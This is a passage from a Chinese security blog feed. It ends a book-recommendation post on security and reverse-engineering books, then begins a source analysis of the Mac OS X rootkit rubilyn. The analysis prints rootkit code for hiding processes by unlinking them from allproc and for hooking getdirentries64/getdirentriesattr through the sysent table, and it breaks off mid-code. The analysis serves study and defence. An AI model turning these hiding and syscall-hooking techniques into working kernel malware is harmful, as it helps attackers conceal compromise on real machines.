&lt;p&gt;&lt;center&gt;&lt;br&gt;富家不用买良田，书中自有千钟粟；&lt;br&gt;安居不用架高堂，书中自有黄金屋；&lt;br&gt;出门莫恨无人随，书中车马多如簇；&lt;br&gt;娶妻莫恨无良媒，书中自有颜如玉；&lt;br&gt;男儿若遂平生志，六经勤向窗前读。&lt;br&gt;&lt;/center&gt;                      &lt;/p&gt;
&lt;p align=&quot;right&quot;&gt; —— 宋真宗赵恒《劝学诗》 &lt;/p&gt;


&lt;h3 id=&quot;移动安全篇&quot;&gt;&lt;a href=&quot;#移动安全篇&quot; class=&quot;headerlink&quot; title=&quot;移动安全篇&quot;&gt;&lt;/a&gt;移动安全篇&lt;/h3&gt;&lt;p&gt;国 内移动安全书籍很少，主要还是以国外的居多，虽然大部分未引进，但是很多可以在网上找到高清彩色英文原版，有些可能就是官方自己发出来的。虽然国外这方面 的书籍多，但看过几本Andorid安全书籍，感觉还是一般，深度不够，比如《Android Security：Attacks and Defenses》、《Android Apps Security》、《Mobile Application Security》、《Mobile Malware Attacks and Defense》,国内的《移动互联网之智能终端安全揭秘》也是不推荐，过多列点组装，缺乏个人主观理解，《Android安全机制解析与应用实践》更是 别买，学术派写的wiki式书籍。笔者推荐几本：《Android Security Cookbook》、《Android 软件安全与逆向分析》主要是讲Android应用安全，Android系统安全的书籍尚无专著出版，不过4月份《Android Hacker’s Handbook》就要出版了，看目录还是感觉蛮有料的，iOS安全书籍相对少一些，主要有《iOS Hacker’s Handbook》（主要讲系统安全，别买中文版，译者缺乏软件安全基础，错误太多，令人不忍直视）、《iOS应用安全攻防》（英文版，偏向应用安全）、 《iOS应用逆向工程:分析与实战》（今年刚出的iOS应用逆向方面的书籍），其它关于Android与iOS开发的书籍，网上电子版很多，自己挑着看 吧，移动安全方面的书籍，我大多是看电子书，买的纸质书基本都是不行。所以目前，移动安全书籍，还是尽量看国内英文原版吧，如果对Android安全感兴 趣的，看下《Android Hacker’s Handbook》一书（补充：目前网上已有电子版）。&lt;/p&gt;
&lt;h3 id=&quot;程序设计篇&quot;&gt;&lt;a href=&quot;#程序设计篇&quot; class=&quot;headerlink&quot; title=&quot;程序设计篇&quot;&gt;&lt;/a&gt;程序设计篇&lt;/h3&gt;&lt;p&gt;此处 程序语言主要以C、ASM为主，毕竟自己主要也只是学这两门语言，其它脚本语言，如PHP、ASP就不提了。关于C语言的书籍就有传说中的 “C语言四大名著”，即《C程序设计语言》、《C和指针》、《C陷阱与缺陷》、《C专家编程》，感觉在C编程上这几本书就够用了，至于数据结构和算法可参 考其它国外名著。国产的编程书籍没几本可出手的，关于C入门书籍，很多人会推荐谭浩强那书，最初我也是读这本书入门的，但后来慢慢地发觉那书不是很好，错 误不少，编程风格也不好。对于那些写着精通XXX、24小时XXX、30天XXX、XXX从入门到精通，这些书都是拿书名来忽悠人的，纯粹是作者用来骗稿 费的，对比一下那些国外名著的书名就知道了，一本好书一般是不会用那些土名字的。我很赞成SAI兄弟说的，半年之内不接触的技术，就不用去买这方面的书籍 了。关于ASM主要就《80x86汇编语言程序设计》、《windows环境下的32位汇编程序设 计》这两本，汇编语言的书籍相对会少一点，一些网上书店的程序设计一栏中甚至没有asm一类。很多编程书籍的内容写的都是千篇一律，比如C语言书籍， 不外乎都是些变量、数组、指针这些，但是某些书籍中就会有提到编程风格、内存优化、树、链表、折半搜索法，GDB调试，linux方面的知识，比如《c primer plus》《C和指针》，这些也算是书本的一个亮点。关于windows编程，首推《windows程序设计》上下册、《windows核心编程》，其它 的感觉也没必要看太多，还是以实践为主。编程书籍由于附有很多代码，在电脑上看电子版的感觉很伤眼，容易眼疲劳，因此有必要的话，可以买实体书来看，而且 在实际应用中，有时可以再拿出来参考参考，方便查阅。与此同时，也要奉劝大家“纸上得来终觉浅，绝知此事要躬行”，特别是对于编程学习者，一定要动手写代 码，光看书是没用，这也是我曾经犯过的错误！而且有些书是用来参考查阅，不是用来看的，不然即使你把那些牛书都看完 ，到最后也可能连几句代码也写不出来，最后受伤的永远是你自己！&lt;/p&gt;
&lt;h3 id=&quot;逆向工程篇&quot;&gt;&lt;a href=&quot;#逆向工程篇&quot; class=&quot;headerlink&quot; title=&quot;逆向工程篇&quot;&gt;&lt;/a&gt;逆向工程篇&lt;/h3&gt;&lt;p&gt;关于逆向工程这方面的书籍，自然是首 推看雪出版的《加密与解密》，在这方面，看雪的实力不会比国外的差，那里是逆向学习交流的好场所。在加解密第3版出版的时候就曾出现过山寨版的，因此大家 在购买时得看清楚了，最好到正规的书店购买，目前可能网上买不到了，不过网上有电子版。另外这方面的书籍还有《黑客反汇编揭密》《黑客调试技术揭密》 《逆向工程揭密》，国内出版的《软件调试》也是本牛书，弥补了国内这方面的空缺。还有出版的《IDA权威指南》也是本不错的书籍，详细讲解了IDA的 方方面面，看了之后，你会发现，会用IDA与不会用的差别有多大了。看雪翻译小组也曾出版过一本《IDA Pro代码破解揭秘》，不过这书我也没看过。在逆向工程这方面的书籍也差不多就这么几本了，其它像加解密入门实战，加密与解密实战超级手册，加解密全攻 略……这些基本上都可以摒弃，基本都是抄看雪加解密一书上的东西，大家无须花金钱、时间和精力在此上面。关于获取最新书讯的方法，大家可以订阅&lt;a href=&quot;http://china-pub.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;互动出版网&lt;/a&gt; 计算机新书的RSS，只要有计算机新书出来立马就知道了，它上面经常更新，不过很也是应用技术书籍，对于这些书籍，很多是 没必要买的，比如什么 windows 7使用大全，精通注册表，windows操作XXX，有必要的话，直接百度、google就行了，没必要花钱去买这类书籍。&lt;/p&gt;
&lt;h3 id=&quot;脚本安全篇&quot;&gt;&lt;a href=&quot;#脚本安全篇&quot; class=&quot;headerlink&quot; title=&quot;脚本安全篇&quot;&gt;&lt;/a&gt;脚本安全篇&lt;/h3&gt;&lt;p&gt;在 脚本攻防方面的书籍，最早的曾云好写的《精通黑客脚本》，这书写得相当全面，由浅入深，虽然不厚，但排版密集，内容还是很多的，只是纸质不太好，很 粗糙，里面有很多渗透实战案例，当年国内这方面的法律还不是很严格，若是放在今天，可能里面一些内容会被删除掉。另外大家也可看看老外的 《黑客攻防技术宝典：WEB实战篇》（重点推荐）《xss attack》《sql injection》（中译本：《SQL注入攻击与防御》），以及《WEB安全测试》，英文版的网上有电子书。近两年国内出版的，主要就《白帽子讲WEB 安全》、《WEB前端黑客技术》，推荐一阅。&lt;/p&gt;
&lt;h3 id=&quot;系统底层篇&quot;&gt;&lt;a href=&quot;#系统底层篇&quot; class=&quot;headerlink&quot; title=&quot;系统底层篇&quot;&gt;&lt;/a&gt;系统底层篇&lt;/h3&gt;&lt;p&gt;当年看的第一本系统原理书籍是《深入理解计算机系统》，很不错的一本书。其它此类书籍还有《深入解析windows操作系统》《widnows系统原理与 实现》等，国内之前还出了本 &lt;a href=&quot;http://www.amazon.cn/mn/detailmore?showtype=3700&amp;amp; prodid=zhbk934046&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《windows操作系统原理》&lt;/a&gt;，上面还写着重点大学计算机教材，后面看了乱雪博客上一篇文章后才知道那书是抄袭的，还被原作者控告了，最后还赔偿 了，当年我还从头看完了。关于溢出攻击的书籍，国内主要有《网络渗透技术》、《0day安全：软件漏洞分析技术》《灰帽黑客》，虽然 网渗一书很早出版，其中有些已经过时，但是其思想是不会过时的。若想获取最新书籍，最好的方法还是上面说的：订阅RSS。对于一些不熟悉的技术书籍，一定 要先看完整目录，然后找找网上是否有电子版的，如果有就先看看再决定是否再买，另外如果你已经买或看过同类的经典书籍，就需要重新考虑是否真的有必要买 了。讲了那么多要花钱的书，下面讲讲免费的一套，那就《intel开发手册》，这一套是由因特尔公司免费向全球赠送的书籍，共五本，之前我还订了两套，全 都从美国寄到学校来了，原本以为第一封邮件没收到，就再发了一封，没想到Intel居然连送两套过来，真是大方的不行啊！现在他们已经不再寄送纸质书，仅 寄送包含电子版的光盘。’&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/buybook/643451796777498842.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;富家不用买良田，书中自有千钟粟；&lt;br&gt;安居不用架高堂，书中自有黄金屋；
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>Mac OSX rootkit rubilyn 源码分析</title>
    <link href="http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/"/>
    <id>http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/</id>
    <published>2012-12-31T16:00:00.000Z</published>
    <updated>2016-06-22T05:17:56.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* modify allproc to hide a specific pid */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hideproc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (p = my_allproc-&amp;gt;lh_first; p != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; p = p-&amp;gt;p_list.le_next) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid == p-&amp;gt;p_pid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(hidden_p_count &amp;lt; MAX_HIDDEN_PROCESS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p[hidden_p_count]=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p_count++;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_lock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    LIST_REMOVE(p, p_list); 	&lt;span class=&quot;comment&quot;&gt;// 移除p_list结构中关于p进程的元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_unlock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;2、隐藏文件&quot;&gt;&lt;a href=&quot;#2、隐藏文件&quot; class=&quot;headerlink&quot; title=&quot;2、隐藏文件&quot;&gt;&lt;/a&gt;2、隐藏文件&lt;/h3&gt;&lt;p&gt;为了对列出文件的相应系统函数进行挂钩，我们需要先对finder和ls所使用的函数进行进程跟踪，在mac上已经用Dtrace代替ktrace，在finder上主要是使用getdirentriesattr函数，而ls主要是使用getdirentries64，下面是用Dtrace分别对finder和ls的进程跟踪情况, calltrace.d 脚本内容如下：&lt;/p&gt;
&lt;figure class=&quot;highlight d&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk&lt;span class=&quot;keyword&quot;&gt;@macosx&lt;/span&gt;:/usr/include/sys$ cat ~/Reverse\ engineering/Dtrace/calltrace.d &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pid$target:::entry&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pid$target:::&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   printf(&lt;span class=&quot;string&quot;&gt;&quot;=%d\n&quot;&lt;/span&gt;, arg1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是查看finder进程2841的调用函数：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:/usr/include/sys$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -p 2841 | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: script &#39;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&#39; matched 573227 probes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 1078881          getdirentriesattr:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 1363229         getdirentriesattr:return =1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是ls命令(64位系统)调用的函数：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:~$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -c ls | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: script &amp;apos;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&amp;apos; matched 28745 probes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: pid 3184 has exited&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 271609          __getdirentries64:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 285894         __getdirentries64:return =1980&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 271609          __getdirentries64:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 285894         __getdirentries64:return =0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此，我们若想在finder和ls中隐藏文件，只要对这两个函数 getdirentriesattr 和 getdirentries64 （32位的为getdirentries）进行挂钩处理即可。在系统调用函数表中，主要是由sysent结构数组构成，每个sysent结构中都包括参数个数sy_narg，执行函数sy_call 这些重要数据。sysent结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sysent &amp;#123; &lt;span class=&quot;comment&quot;&gt;/* system call table */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int16_t&lt;/span&gt; sy_narg; &lt;span class=&quot;comment&quot;&gt;/* number of args */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt; sy_resv; &lt;span class=&quot;comment&quot;&gt;/* reserved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt; sy_flags; &lt;span class=&quot;comment&quot;&gt;/* flags */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_call_t&lt;/span&gt; *sy_call; &lt;span class=&quot;comment&quot;&gt;/* implementing function */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_munge_t&lt;/span&gt; *sy_arg_munge32; &lt;span class=&quot;comment&quot;&gt;/* system call arguments munger for 32-bit process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_munge_t&lt;/span&gt; *sy_arg_munge64; &lt;span class=&quot;comment&quot;&gt;/* system call arguments munger for 64-bit process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; sy_return_type; &lt;span class=&quot;comment&quot;&gt;/* system call return types */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; sy_arg_bytes; &lt;span class=&quot;comment&quot;&gt;/* Total size of arguments in bytes for* 32-bit system calls */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为了实现对上述系统函数的挂钩，通过修改相应函数sysent结构的sy_call来进行偷梁换柱，关于各系统函数的调用号和宏名均可在 /usr/include/sys/syscall.h中找到：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:/usr/include/sys$ cat syscall.h | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentries  196&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentriesattr 222&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentries64 344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是rubilyn中对系统调用函数getdirentries64 和 getdirentriesattr的挂钩代码，将这两个函数替换为自定义的 new_getdirentries64  和 new_getdirentriesattr ，同时保存原函数地址方便获取目录信息并进行篡改：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nsysent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    table = find_sysent();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(table)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* back up original syscall pointers */&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org_getdirentries64 = (void *) table[SYS_getdirentries64].sy_call; 	&lt;span class=&quot;comment&quot;&gt;// 保存原系统函数地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org_getdirentriesattr = (void *) table[SYS_getdirentriesattr].sy_call; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* replace syscalls in syscall table */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        table[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;	&lt;span class=&quot;comment&quot;&gt;// 